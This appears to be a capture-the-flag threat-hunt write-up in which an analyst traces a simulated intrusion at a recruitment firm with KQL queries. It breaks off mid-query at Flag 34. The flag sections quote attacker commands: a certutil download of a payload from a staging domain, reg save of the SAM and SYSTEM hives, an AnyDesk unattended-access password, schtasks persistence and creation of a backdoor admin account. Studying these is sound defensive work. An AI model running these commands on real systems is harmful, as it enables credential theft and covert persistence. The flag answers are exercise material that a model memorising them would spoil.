1. [Incident Overview]()
2. [Threat Hunt]()
3. [Root Cause Analysis]()
4. [Threat Actor Timeline]()
5. [Immediate Reponse]()
6. [Business Impact]()
7. [Appendix A: Indicators of Compromise (IOCs)]()
8. [Appendix B: MITRE ATT&CK Mapping]()
9. [Appendix C: CTF Flags]()
## Incident Overview

**The Broker** <br>
Organization: Ashford Sterling Recruitment <br>
Timeframe; 15 JAN 2026 <br>
Status: Ongoing <br>
Analyst Assigned: `Fasi Sika` <br>
Report Date: 25 FEB 2026

A compromised user account is being used to conduct interactive attack activity. This behavior is indicative of an attacker who has gained access to valid credentials and is manually executing commands on the system.
## Threat Hunt

### Section 1: Initial Access
The attacker needed a way in. Something landed on an endpoint - whether it was clicked, downloaded, or delivered - and kicked off the entire compromise. Trace the infection back to its origin. Identify what arrived, how it executed, and what it spawned.
#### 🚩Flag 1: Initial Vector
**Question**: Identify the file that started the infection chain <br>
The file `daniel_richardson_cv.pdf.exe` uses a double file extension, a common social engineering technique used by attackers to disguise malicious files as legitimate documents. Windows hides known file extensions by default, causing this file to appear as `daniel_richardson_cv.pdf` to the victim. This deception makes the file appear to be a resume or PDF document, increasing the likelihood the victim will open the file. As a recruiting company, it is very common for them to work with PDFs. Once executed, the file initiates the infection chain. 

**KQL query used**: 
```KQL
DeviceProcessEvents
| where Timestamp > datetime(2026-01-15T00:00:00Z)
| where DeviceName == "as-pc1"
| project Timestamp, ActionType, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine, SHA256, InitiatingProcessFileName, InitiatingProcessParentFileName, InitiatingProcessSHA256
| order by Timestamp asc
```

<details>
<summary>Finding</summary>

**Finding**: `daniel_richardson_cv.pdf.exe` <br>
**Timestamp**: `2026-01-15T03:58:55.6563735Z`

</details>
#### 🚩Flag 2: Payload Hash
**Question**: Identify the SHA256 hash of the initial payload

The SHA256 hash of `daniel_richardson_cv.pdf.exe` was confirmed to be `48b97fd91946e81e3e7742b3554585360551551cbf9398e1f34f4bc4eac3a6b5`

**KQL query used**: 
```KQL
DeviceProcessEvents
| where Timestamp > datetime(2026-01-15T00:00:00Z)
| where DeviceName == "as-pc1"
| project Timestamp, ActionType, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine, SHA256, InitiatingProcessFileName, InitiatingProcessParentFileName, InitiatingProcessSHA256
| order by Timestamp asc
```

<details>
<summary>Finding</summary>

**Finding**: `48b97fd91946e81e3e7742b3554585360551551cbf9398e1f34f4bc4eac3a6b5` <br>
**Timestamp**: `2026-01-15T03:58:55.6563735Z`

</details>

#### 🚩Flag 3: User Interaction
**Question**: What parent process indicates the method of execution?

The parent process of the malicious executable was `explorer.exe`, which indicates the malware was manually launched within Windows File Explorer by a user, rather than execution through scripting or an automated process.

**KQL query used**: 
```KQL
DeviceProcessEvents
| where Timestamp > datetime(2026-01-15T00:00:00Z)
| where DeviceName == "as-pc1"
| where InitiatingProcessFileName == "daniel_richardson_cv.pdf.exe"
| project Timestamp, ActionType, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine, SHA256, InitiatingProcessFileName, InitiatingProcessParentFileName, InitiatingProcessSHA256
| order by Timestamp asc
```

<details>
<summary>Finding</summary>

**Finding**: `explorer.exe` <br>
**Timestamp**: `2026-01-15T03:58:55.6563735Z`

</details>
#### 🚩Flag 4: Suspicious Child Process
**Question**: What legitimate Windows process was spawned?

After `daniel_richardson_cv.pdf.exe` as executed, the file spawned the Windows process, `notepad.exe`, a legitimate Windows executable commonly used to open and modify text files. Attackers use legitimate system binaries to host malicious code or execute payloads under a trusted process to evade detection.

**KQL query used**: 
```KQL
DeviceProcessEvents
| where Timestamp > datetime(2026-01-15T00:00:00Z)
| where DeviceName == "as-pc1"
| where InitiatingProcessFileName == "daniel_richardson_cv.pdf.exe"     
    or InitiatingProcessSHA256 ==
    "48b97fd91946e81e3e7742b3554585360551551cbf9398e1f34f4bc4eac3a6b5"
| project Timestamp, ActionType, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine, 
	SHA256, InitiatingProcessFileName, InitiatingProcessParentFileName,InitiatingProcessSHA256
| order by Timestamp asc
```

<details>
<summary>Finding</summary>

**Finding**: `notepad.exe` <br>
**Timestamp**: `2026-01-15T05:09:53.3995975Z`

</details>
#### 🚩Flag 5: Process Arguments
**Question**: The spawned process executed with unusual arguments. What was the full command line?

The malicious executbale launched Notepad using the command:
```cmd
notepad.exe ""
```

Typically, Notepad is executed with a filename argument
```cmd
notepad.exe file.txt
```
However, the command `notepad.exe ""` launches Notepad with no file argument, which is uncommon for normal user activity. This may allow the attacker to execute malicious commands within Notepad under legitimate host process. Based on the alert generated, `Notepad.exe` was likely used as to inject malicious code into memory.

**KQL query used**: 
```KQL
DeviceProcessEvents
| where Timestamp > datetime(2026-01-15T00:00:00Z)
| where DeviceName == "as-pc1"
| where InitiatingProcessFileName == "daniel_richardson_cv.pdf.exe"     
    or InitiatingProcessSHA256 ==
    "48b97fd91946e81e3e7742b3554585360551551cbf9398e1f34f4bc4eac3a6b5"
| project Timestamp, ActionType, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine, 
	SHA256, InitiatingProcessFileName, InitiatingProcessParentFileName,InitiatingProcessSHA256
| order by Timestamp asc
```

<details>
<summary>Finding</summary>

**Finding**: `notepad.exe ""` <br>
**Timestamp**: `2026-01-15T05:09:53.3995975Z`

</details>

### Section 2: Command & Control
> With a foothold established, the attacker needed to talk back to their infrastructure. Outbound connections were made to adversary-controlled domains. Identify how the attacker maintained communication and where their infrastructure lives.
#### 🚩Flag 6: C2 Domain
**Question**: What domain was used for command and control?

The domain `cdn.cloud-endpoint.net` was identified as the C2 domain used by the attacker. This domain received an outbound connection from the compromised host, `AS-PC1`, shortly after the malicious payload was executed. This domain resemble legitimate cloud domain to blend its malicious traffic with normal network activity. 

**KQL query used**: 
```KQL
DeviceNetworkEvents
| where Timestamp > datetime(2026-01-15T00:00:00Z)
| where DeviceName =~ "as-pc1"
| where ActionType has_any ("ConnectionSuccess", "ConnectionAttempt")
| where isnotempty(RemoteUrl)
| project Timestamp, ActionType, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName,
    InitiatingProcessFolderPath, InitiatingProcessSHA256, InitiatingProcessCommandLine, RemoteIP, RemotePort, RemoteUrl
| sort by Timestamp asc
```

<details>
<summary>Finding</summary>

**Finding**: `cdn.cloud-endpoint.net` <br>
**Timestamp**: `2026-01-15T04:04:33.2301079Z`

</details>
#### 🚩Flag 7: C2 Process
**Question**: What process initiated the outbound connections?

Network activity shows outbound connections towards `cdn.cloud-endpoint.net` were initiated by `Daniel_Richardson_CV.pdf.exe`. This confirms the executable established the initial beacon to their C2 server.

**KQL query used**: 
```KQL
DeviceNetworkEvents
| where Timestamp > datetime(2026-01-15T00:00:00Z)
| where DeviceName =~ "as-pc1"
| where RemoteUrl == "cdn.cloud-endpoint.net"
| project Timestamp, ActionType, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName,
    InitiatingProcessFolderPath, InitiatingProcessSHA256, InitiatingProcessCommandLine, RemoteIP,
    RemotePort, RemoteUrl
| sort by Timestamp asc
```

<details>
<summary>Finding</summary>

**Finding**: `daniel_richardson_cv.pdf.exe` <br>
**Timestamp**: `2026-01-15T03:47:10.786699Z`

</details>

#### 🚩Flag 8: Staging Infrastructure
**Question**: What domain was used for payload staging?

The domain `sync.cloud-endpoint.net` was used as payload staging infrastructure as network logs show the attacker using the Windows utility `certutil.exe` to download an additional payload. In order to avoid dection, the attacker renamed the downloaded payload as `RuntimeBroker.exe` which is the name of a legitimate Windows process. 

**Observed attacker command**: 
```cmd
certutil.exe -urlcache -split -f https://sync.cloud-endpoint.net/Daniel_Richardson_CV.pdf.exe C:\Users\Public\RuntimeBroker.exe
```

**KQL query used**: 
```KQL
DeviceNetworkEvents
| where Timestamp > datetime(2026-01-15T00:00:00Z)
| where RemoteUrl has "cloud-endpoint.net"
| project Timestamp, ActionType, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName,
    InitiatingProcessFolderPath, InitiatingProcessSHA256, InitiatingProcessCommandLine, RemoteIP,
    RemotePort, RemoteUrl
| sort by Timestamp asc
```

<details>
<summary>Finding</summary>

**Finding**: `sync.cloud-endpoint.net` <br>
**Timestamp**: `2026-01-15T04:52:23.0978038Z`

</details>

### Section 3: Credential Access
> Credentials are the keys to the kingdom. The attacker went after stored secrets on the compromised host - targeting local credential stores and using in-memory techniques to extract authentication material. Determine what was targeted, how it was stolen, and who was doing it.
#### 🚩Flag 9: Registry Targets
**Question**: The attacker targeted local credential stores. What two registry hives were targeted?

The attacker used the Windows registry utility `reg.exe` to extract credential data from the system. 

**Observed commands**: 
```cmd
reg.exe save HKLM\SAM C:\Users\Public\sam.hiv
reg.exe save HKLM\SYSTEM C:\Users\Public\system.hiv
```

Security Account Manager (SAM) hive stores local user account information and password hashes, while SYSTEM hive contains encryption keys required to decrypt the hashes. By capturing these hives, the attacker can later perform offline password cracking to recover plaintext credentials. 

**KQL query used**: 
```KQL
DeviceProcessEvents
| where Timestamp > datetime(2026-01-15T00:00:00Z)
| where DeviceName =~ "as-pc1"
| where ProcessCommandLine has_any ("HKLM", "HKEY", ".hiv")
| project Timestamp, ActionType, DeviceName, AccountName, FileName, ProcessCommandLine, 
    InitiatingProcessCommandLine, InitiatingProcessSHA256
| sort by Timestamp asc
```

<details>
<summary>Finding</summary>

**Finding**: `SAM, SYSTEM` <br>
**Timestamp**: `2026-01-15T04:13:32.7652183Z`

</details>
#### 🚩Flag 10: Local Staging
**Question**: Extracted data was saved locally before exfiltration. Where were the credentials saved?

The extracted registry hives were staged in the directory `C:\Users\Public`, a common Public folder writable by al users. These files are likely intended for future exfiltration or cracking. 

**KQL query used**: 
```KQL
DeviceProcessEvents
| where Timestamp > datetime(2026-01-15T00:00:00Z)
| where DeviceName =~ "as-pc1"
| where ProcessCommandLine has_any ("HKLM", "HKEY", ".hiv")
| project Timestamp, ActionType, DeviceName, AccountName, FileName, ProcessCommandLine, 
    InitiatingProcessCommandLine, InitiatingProcessSHA256
| sort by Timestamp asc
```

<details>
<summary>Finding</summary>

**Finding**: `C:\Users\Public` <br>
**Timestamp**: `2026-01-15T04:13:32.7652183Z`

</details>

#### 🚩Flag 11: Execution Identity
**Question**: What user performed this action?

The credential extraction commands were executed under the user `sophie.turner`. This is another confirmation that the attacker was operating within a valid compromised user session. As a legitimate user account, this activity could blend in with their normal activity as opposed to executing these commands as SYSTEM or Administrator.

**KQL query used**: 
```KQL
DeviceProcessEvents
| where Timestamp > datetime(2026-01-15T00:00:00Z)
| where DeviceName =~ "as-pc1"
| where ProcessCommandLine has_any ("HKLM", "HKEY", ".hiv")
| project Timestamp, ActionType, DeviceName, AccountName, FileName, ProcessCommandLine, 
    InitiatingProcessCommandLine, InitiatingProcessSHA256
| sort by Timestamp asc
```

<details>
<summary>Finding</summary>

**Finding**: `sophie.turner` <br>
**Timestamp**: `2026-01-15T04:13:32.7652183Z`

</details>

### Section 4: Discovery 
> Before moving deeper, the attacker needed to understand the environment. They ran commands to figure out who they were, what was around them, and what they could reach. Identify the reconnaissance activity and what intelligence the attacker gathered.
#### 🚩Flag 12: User Context
**Question**: The attacker confirmed their identity  after initial access. What command was used?

The attacker executed the command `whoami.exe` to display information about the current user on the system. This command is commonly ran after successfully gaining access to a system, allowing the attacker to know what account they're operating on and the privilege level of the account. 

**KQL query used**: 
```KQL
DeviceProcessEvents
| where Timestamp > datetime(2026-01-15T00:00:00Z)
| where AccountName == "sophie.turner"
| project Timestamp, ActionType, DeviceName, AccountName, FileName, ProcessCommandLine, 
    InitiatingProcessFileName, InitiatingProcessCommandLine
| sort by Timestamp asc
```

<details>
<summary>Finding</summary>

**Finding**: `whoami.exe` <br>
**Timestamp**: `2026-01-15T03:58:55.6563735Z`

</details>
#### 🚩Flag 13: Network Enumeration
**Question**: What command was used to view available shares?

The attacker is seen executing the command `net.exe view`, which lists available network shares and systems on the local network. This allows the attacker to identify additional systems to target for lateral movement. 

**KQL query used**: 
```KQL
DeviceProcessEvents
| where Timestamp > datetime(2026-01-15T00:00:00Z)
| where AccountName == "sophie.turner"
| project Timestamp, ActionType, DeviceName, AccountName, FileName, ProcessCommandLine, 
    InitiatingProcessFileName, InitiatingProcessCommandLine
| sort by Timestamp asc
```

<details>
<summary>Finding</summary>

**Finding**: `net.exe view` <br>
**Timestamp**: `2026-01-15T04:01:32.0791816Z`

</details>
#### 🚩Flag 14: Local Admins
**Question**: The attacker enumerated privileged local group memebership. What group was queried?

Additionally, the attacker executed the command `net localgroup administrators` which lists the members of the local Administrators group on the system. This identifies accounts with elevated privileges which the attacker can target for privilege escalation. 

**KQL query used**: 
```KQL
DeviceProcessEvents
| where Timestamp > datetime(2026-01-15T00:00:00Z)
| where AccountName == "sophie.turner"
| where ProcessCommandLine has "net"
| project Timestamp, ActionType, DeviceName, AccountName, FileName, ProcessCommandLine, 
    InitiatingProcessFileName, InitiatingProcessCommandLine
| sort by Timestamp asc
```

<details>
<summary>Finding</summary>

**Finding**: `administrators` <br>
**Timestamp**: `2026-01-15T04:01:19.1611938Z`

</details>

### Section 5: Persistence - Remote Tool
> The attacker wasn't planning a short visit. Multiple mechanisms were deployed to ensure continued access - legitimate tools repurposed, tasks scheduled, accounts created. Map out every backdoor they left behind.
#### 🚩Flag 15: Remote Tool
**Question**: A legitimate remote administator tool was deployed for ongoing access. What software was installed?

The attacker installed the remote tool `AnyDesk`, a remote desktop tool. Although AnyDesk is a common and legitimate tool, it can be used by attackers as a form of persistence. Once installed and configured, the attacker could reconnect to the compromised system at any time it is active. 

**KQL query used**: 
```KQL
DeviceFileEvents
| where Timestamp > datetime(2026-01-15T00:00:00Z)
| where DeviceName =~ "as-pc1"
| where InitiatingProcessAccountName == "sophie.turner"
| project Timestamp, ActionType, DeviceName, InitiatingProcessAccountName, FileName, FolderPath,
    InitiatingProcessCommandLine, SHA256, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessSHA256
| sort by Timestamp asc
```

<details>
<summary>Finding</summary>

**Finding**: `Anydesk` <br>
**Timestamp**: `2026-01-15T04:08:31.0759602Z`

</details>

#### 🚩Flag 16: Remote Tool Hash
**Question**: Identify the SHA256 hash of the remote access tool.

The SHA256 hash of `AnyDesk.exe` was identified as `f42b635d93720d1624c74121b83794d706d4d064bee027650698025703d20532`

**KQL query used**: 
```KQL
DeviceFileEvents
| where Timestamp > datetime(2026-01-15T00:00:00Z)
| where DeviceName =~ "as-pc1"
| where FileName =~ "Anydesk"
| where InitiatingProcessAccountName == "sophie.turner"
| project Timestamp, ActionType, DeviceName, InitiatingProcessAccountName, FileName, FolderPath,
    InitiatingProcessCommandLine, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessSHA256
| sort by Timestamp asc
```

<details>
<summary>Finding</summary>

**Finding**: `f42b635d93720d1624c74121b83794d706d4d064bee027650698025703d20532` <br>
**Timestamp**: `2026-01-15T04:08:31.0759602Z`

</details>

#### 🚩Flag 17: Download Method
**Question**: The tool was downloaded using a native Windows binary. What binary/executable was used?

The attacker downloaded the remote tool using the Windows utility `certuitl.exe` using the following command: 
```cmd
certutil  -urlcache -split -f https://download.anydesk.com/AnyDesk.exe C:\Users\Public\AnyDesk.exe
```

`certutil.exe` is commonly abused by attackers [(LOLbin)](https://lolbas-project.github.io/#s) as it is native Windows tool capable of downloading files from the internet. 

**KQL query used**: 
```KQL
DeviceProcessEvents
| where Timestamp > datetime(2026-01-15T00:00:00Z)
| where DeviceName =~ "as-pc1"
| where ProcessCommandLine has "anydesk"
| project Timestamp, ActionType, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine,
    SHA256, InitiatingProcessFileName
| sort by Timestamp asc
```

<details>
<summary>Finding</summary>

**Finding**: `certutil` <br>
**Timestamp**: `2026-01-15T04:08:31.0759602Z`

</details>

#### 🚩Flag 18: Configuration Access
**Question**: After installation, a configuration file was accessed. What is the full path of this file?

After installing AnyDesk, the attacker accessed the configuration file located in: 
`C:\Users\Sophie.Turner\AppData\Roaming\AnyDesk\system.conf`

Accessing this file suggests the attacker was modifying the AnyDesk configuration to enable persistent remote access without requiring user interaction.

**KQL query used**: 
```KQL
DeviceProcessEvents
| where Timestamp > datetime(2026-01-15T00:00:00Z)
| where DeviceName =~ "as-pc1"
| where ProcessCommandLine has ".conf"
| project Timestamp, ActionType, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine,
    SHA256, InitiatingProcessFileName
| sort by Timestamp asc
```

<details>
<summary>Finding</summary>

**Finding**: `C:\Users\Sophie.Turner\AppData\Roaming\AnyDesk\system.conf` <br>
**Timestamp**: `2026-01-15T04:11:13.5896114Z`

</details>

#### 🚩Flag 19: Access Credentials
**Question**: Unattended access was configured for the remote tool. What password was set?

The attacker configured unattended access for AnyDesk by setting the password `intrud3r!` using the following command: 
```PowerShell
cmd.exe /c "echo intrud3r! | C:\Users\Public\AnyDesk.exe --set-password"
```

This unattended access allows remote connections without user approval. This gives the attacker persistent remote access of the compromised system even if `sophie.turner` password is changed. 

**KQL query used**: 
```KQL
DeviceProcessEvents
| where Timestamp > datetime(2026-01-15T00:00:00Z)
| where DeviceName =~ "as-pc1"
| where ProcessCommandLine has "anydesk"
| project Timestamp, ActionType, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine,
    SHA256, InitiatingProcessFileName
| sort by Timestamp asc
```

<details>
<summary>Finding</summary>

**Finding**: `intrud3r!` <br>
**Timestamp**: `2026-01-15T04:11:47.1679716Z

</details>

#### 🚩Flag 20: Deployment Footprint
**Question**: The remote tool was installed across the environment. List all the hostnames where it was deployed. 

Analysis of file creation events show `AnyDesk.exe` being deployed across multiple hosts:
- `AS-PC1`
- `AS-PC2`
- `AS-SRV`

This indicates the attacker was able to extend their access beyond the initial compromised system `AS-PC1`, and install the remote access tool across additional systems in the environment.

**KQL query used**: 
```KQL
DeviceFileEvents
| where Timestamp > datetime(2026-01-15T00:00:00Z)
| where DeviceName startswith "as-"
| where FileName =~ "Anydesk.exe"
    or SHA256 == "f42b635d93720d1624c74121b83794d706d4d064bee027650698025703d20532"
| project Timestamp, ActionType, DeviceName, InitiatingProcessAccountName, FileName, 
    FolderPath, SHA256, InitiatingProcessCommandLine, InitiatingProcessFileName
| sort by Timestamp asc
```

<details>
<summary>Finding</summary>

**Finding**: `AS-PC1, AS-PC2, AS-SRV

</details>

### Section 6: Lateral Movement
> One host wasn't enough. The attacker moved through the environment, and not every method worked the first time. Track the path they took, the tools they tried, the accounts they used, and the order they moved.
#### 🚩Flag 21: Failed Execution
**Question**: The attacker attempted remote execution methods that failed. What two tools were tried?

The attacker attempted to move laterally to host `AS-PC2` using two common Windows remote execution tools: 
- `WMIC.exe`
- `PsExec.exe`
Both tools allow the execution of commands remotely to other machines in the network. The first attempt uses `WMIC.exe` to create a process on `AS-PC2`, downloading `AnyDesk.exe`:
```cmd
"WMIC.exe" /node:AS-PC2 /user:Administrator /password:******** process call create "cmd.exe /c certutil -urlcache -split -f https://download.anydesk.com/AnyDesk.exe C:\Users\Public\AnyDesk.exe"
```

Then the attacker attempted a second time using `PsExec`, a [Sysinternals]() tool:
```cmd
"PsExec.exe" -accepteula \\AS-PC2 -u AS-PC2\Administrator -p ********** cmd.exe
```

**KQL query used**: 
```KQL
DeviceProcessEvents
| where Timestamp > datetime(2026-01-15T00:00:00Z)
| where DeviceName has "as-"
| where InitiatingProcessFileName has_any ("powershell", "cmd")
| project Timestamp, ActionType, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine,
    SHA256, InitiatingProcessCommandLine, InitiatingProcessFileName
| sort by Timestamp asc
```

<details>
<summary>Finding</summary>

**Finding**: `WMIC.EXE, PsExec.exe` <br>
**Timestamp**: `2026-01-15T04:18:44.6123349Z`

</details>

#### 🚩Flag 22: Target Host
**Question**: What hostname was targeted in the failed attempts?

The failed lateral movement attempts targeted the host `AS-PC2`. This suggests the attacker identified `AS-PC2` as potential pivot point within the network and attempted to remotely execute commands on the system.

**KQL query used**: 
```KQL
DeviceProcessEvents
| where Timestamp > datetime(2026-01-15T00:00:00Z)
| where DeviceName has "as-"
| where InitiatingProcessFileName has_any ("powershell", "cmd")
| project Timestamp, ActionType, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine,
    SHA256, InitiatingProcessCommandLine, InitiatingProcessFileName
| sort by Timestamp asc
```

<details>
<summary>Finding</summary>

**Finding**: `as-pc2` <br>
**Timestamp**: `2026-01-15T04:18:44.6123349Z`

</details>
#### 🚩Flag 23: Successful Pivot
**Question**: After failed attempts,  a different method achieved lateral movement. What windows executable was used?

After multiple failed attempts using `WMIC.exe` and `PsExec.exe`, the attacker was able to laterally move successfully using `mstsc.exe`:
```cmd
"mstsc.exe" /v:10.1.0.203
```

**KQL query used**: 
```KQL
DeviceProcessEvents
| where Timestamp > datetime(2026-01-15T00:00:00Z)
| where DeviceName has "as-"
| where InitiatingProcessFileName has_any ("powershell", "cmd")
| project Timestamp, ActionType, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine,
    SHA256, InitiatingProcessCommandLine, InitiatingProcessFileName
| sort by Timestamp asc
```

<details>
<summary>Finding</summary>

**Finding**: `mstsc.exe` <br>
**Timestamp**: `2026-01-15T04:29:43.9940417Z`

</details>

#### 🚩Flag 24: Movement Path
**Question**: The attacker moved through the environment in a specific sequence. What is the full lateral movement path?

Anydesk was confirmed on the following hosts: `as-pc1`, `as-pc2`, and `as-srv`. Based on the lateral movement attempts, the threat actor used `as-pc1` as the initial host and `as-pc2` as lateral movement point to `as-srv`.


**KQL query used**: 
```KQL
DeviceProcessEvents
| where Timestamp > datetime(2026-01-15T00:00:00Z)
| where DeviceName has "as-"
| where FileName in ("mstsc.exe","wmic.exe","psexec.exe")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine
| order by Timestamp asc
```

<details>
<summary>Finding</summary>

**Finding**: `as-pc1 > as-pc2 > as-srv`

</details>

#### 🚩Flag 25: Compromised Account
**Question**: What username authenticated successfully?

LogonEvents indicate the user account, `david.mitchell`, to have successfully authenticate on `AS-PC2`. 

**KQL query used**: 
```KQL
DeviceLogonEvents
| where Timestamp > datetime(2026-01-15T00:00:00Z)
| where DeviceName has "as-pc2"
| where ActionType == "LogonSuccess"
| project Timestamp, ActionType, DeviceName, AccountName, InitiatingProcessFileName, 
    InitiatingProcessCommandLine, LogonType, RemoteDeviceName, RemoteIP
| sort by Timestamp asc
```

<details>
<summary>Finding</summary>

**Finding**: `david.mitchell` <br>
**Timestamp**: `2026-01-15T04:54:55.7957282Z`

</details>

#### 🚩Flag 26: Account Activation
**Question**: What net.exe parameter was used to activate the account?

The attacker enabled a previously disabled account using the following command: 
```cmd
"net.exe" user Administrator /active:yes
```

The reasoning for the Administrator account being disabled was not disclosed. With the attacker re-enabling the account, this provides another potential authentication path into the environment. 

**KQL query used**: 
```KQL
DeviceProcessEvents
| where Timestamp > datetime(2026-01-15T00:00:00Z)
| where DeviceName has_any ("as-pc1", "as-pc2", "as-srv")
| where ProcessCommandLine has "net.exe"
| project Timestamp, ActionType, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine, 
    SHA256, InitiatingProcessCommandLine, InitiatingProcessFileName
| sort by Timestamp asc
```

<details>
<summary>Finding</summary>

**Finding**: `/active:yes` <br>
**Timestamp**: `2026-01-15T04:40:31.9488698Z`

</details>

#### 🚩Flag 27: Activation Context
**Question**: Who performed this action?

The command used to activate the account was executed under the user `david.mitchel`

**KQL query used**: 
```KQL
DeviceProcessEvents
| where Timestamp > datetime(2026-01-15T00:00:00Z)
| where DeviceName has_any ("as-pc1", "as-pc2", "as-srv")
| where ProcessCommandLine has "net.exe"
| project Timestamp, ActionType, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine, 
    SHA256, InitiatingProcessCommandLine, InitiatingProcessFileName
| sort by Timestamp asc
```

<details>
<summary>Finding</summary>

**Finding**: `david.mitchell`

</details>
### Section 7: Persistence - Scheduled Task
> The attacker planted additional persistence beyond the remote tool. Scheduled tasks and new accounts extend their access even if one mechanism is discovered and removed.
#### 🚩Flag 28 Scheduled Persistence 
**Question**: A scheduled task was created for persistence. What is the task name?

The attacker created a scheduled task `MicrosoftEdgeUpdateCheck` using the following command:
```cmd
"schtasks.exe" /create /tn MicrosoftEdgeUpdateCheck /tr C:\Users\Public\RuntimeBroker.exe /sc daily /st 03:00 /rl highest /f
```
- `schtasks.exe` Windows scheduled task utility
- `/create` creates a new scheduled task
- `/tn MicrosoftEdgeUpdateCheck` name of task
- `/tr C:\Users\Public\RuntimeBroker.exe` program ran by task
- `/sc daily` task runs daily
- `/st 03:00` task runs at 3:00 am
- `/rl highest` task runs with highest privileges
- `/f` force creates task if it already exists

The task name `MicrosoftEdgeUpdateCheck` was chosen by the attacker to evade detection as this name resembles a legitimate process. Additionally, the persistence mechanism ensures this malware executes automatically even after a system reboot. 

**KQL query used**: 
```KQL
DeviceProcessEvents
| where Timestamp > datetime(2026-01-15T00:00:00Z)
| where DeviceName has_any ("as-pc1", "as-pc2", "as-srv")
| where ProcessCommandLine has "schtasks"
| project Timestamp, ActionType, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine, 
    SHA256, InitiatingProcessCommandLine, InitiatingProcessFileName, InitiatingProcessSHA256
| sort by Timestamp asc
```

<details>
<summary>Finding</summary>

**Finding**: `MicrosoftEdgeUpdateCheck` <br>
**Timestamp**: `2026-01-15T04:52:32.6871861Z`

</details>

#### 🚩Flag 29: Renamed Binary
**Question**: The persistence payload was renamed to avoid detection. What filename was used?

The persistence payload was renamed to `RuntimeBroker.exe`, which is the name of a legitimate process normally located in `C:\Windows\System32\`. However, the malicious file is stored in `C:\Users\Public`, the data staging location discovered earlier. 

**KQL query used**: 
```KQL
DeviceProcessEvents
| where Timestamp > datetime(2026-01-15T00:00:00Z)
| where DeviceName has_any ("as-pc1", "as-pc2", "as-srv")
| where ProcessCommandLine has "schtasks"
| project Timestamp, ActionType, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine, 
    SHA256, InitiatingProcessCommandLine, InitiatingProcessFileName, InitiatingProcessSHA256
| sort by Timestamp asc
```

<details>
<summary>Finding</summary>

**Finding**: `RuntimeBroker.exe` <br>
**Timestamp**: `2026-01-15T04:52:32.6871861Z`

</details>

#### 🚩Flag 30: Persistence Hash
**Question**: What is the SHA256 hash?

The SHA256 hash of the persistence payload was `48b97fd91946e81e3e7742b3554585360551551cbf9398e1f34f4bc4eac3a6b5`, which is the same SHA256 hash as `daniel_richardson_cv.pdf.exe` payload. 

This confirms the attacker reused their payload, renaming it to `RunTimeBroker.exe` and configured it to run via scheduled task. 

**KQL query used**: 
```KQL
DeviceProcessEvents
| where Timestamp > datetime(2026-01-15T00:00:00Z)
| where DeviceName has_any ("as-pc1", "as-pc2", "as-srv")
| where FileName has "RunTimeBroker" and 
    FolderPath !has @"C:\Windows\System32\"
| project Timestamp, ActionType, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine, 
    SHA256, InitiatingProcessCommandLine, InitiatingProcessFileName, InitiatingProcessSHA256
| sort by Timestamp asc
```

<details>
<summary>Finding</summary>

**Finding**: `48b97fd91946e81e3e7742b3554585360551551cbf9398e1f34f4bc4eac3a6b5`

</details>
#### 🚩Flag 31: Backdoor Account
**Question**: A new backdoor account was created for future access. What is the username?

User created local account svc_backup and added to local administrator group
```cmd
net.exe user svc_backup ********** /add
net.exe localgroup Administrators svc_backup /add
```

By creating this account and adding it to the Administrators group, the attacker established a backdoor account and yet another form of persistence within the compromised systems. 

**KQL query used**: 
```KQL
DeviceProcessEvents
| where Timestamp > datetime(2026-01-15T00:00:00Z)
| where DeviceName has_any ("as-pc1", "as-pc2", "as-srv")
| where ProcessCommandLine has "/add"
| project Timestamp, ActionType, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine, InitiatingProcessFileName
| sort by Timestamp asc
```

<details>
<summary>Finding</summary>

**Finding**: `svc_backup` <br>
**Timestamp**: `2026-01-15T04:57:47.0153078Z`

</details>

### Section 8: Data Access
> The attacker found what they came for. Sensitive data was located, accessed, and staged for extraction. Identify what was taken, where it was accessed from, and how it was packaged.
#### 🚩Flag 32: Sensitive Document
**Question**: A sensistive document was accessed on the file server. What is the filename?

The attacker accessed the file `BACS_Payments_Dec2025.ods`, which likely contains sensitive financial information. 

**KQL query used**: 
```KQL
DeviceFileEvents
| where Timestamp > datetime(2026-01-15T00:00:00Z)
| where DeviceName has "as-srv"
| where FolderPath has @"C:\Shares"
| project Timestamp, ActionType, DeviceName, InitiatingProcessAccountName, FileName, FolderPath, InitiatingProcessCommandLine, InitiatingProcessFileName, SHA256
| sort by Timestamp asc
```

<details>
<summary>Finding</summary>

**Finding**: `BACS_Payments_Dec2025.ods

</details>
#### 🚩Flag 33: Modification Evidence
**Question**: The document was opened for editing, not just viewing. What file artifact proves this? 

The presence of the file `.~lock.BACS_Payments_Dec202.ods#` indicates the file was opened for editing. 

**KQL query used**: 
```KQL
DeviceFileEvents
| where Timestamp > datetime(2026-01-15T00:00:00Z)
| where DeviceName has "as-srv"
| where FolderPath has @"C:\Shares"
| project Timestamp, ActionType, DeviceName, InitiatingProcessAccountName, FileName, FolderPath, InitiatingProcessCommandLine, InitiatingProcessFileName, SHA256
| sort by Timestamp asc
```

<details>
<summary>Finding</summary>

**Finding**: `.~lock.BACS_Payments_Dec2025.ods#`

</details>

#### 🚩Flag 34: Access Origin
**Question**: The document was accessed from a specific workstation. What hostname accessed this file?

Logs show the document was accessed from the host `AS-PC2`

**KQL query used**: 
```KQL
DeviceFileEvents
| where Timestamp > datetime(2026-01-15T00:00:00Z)
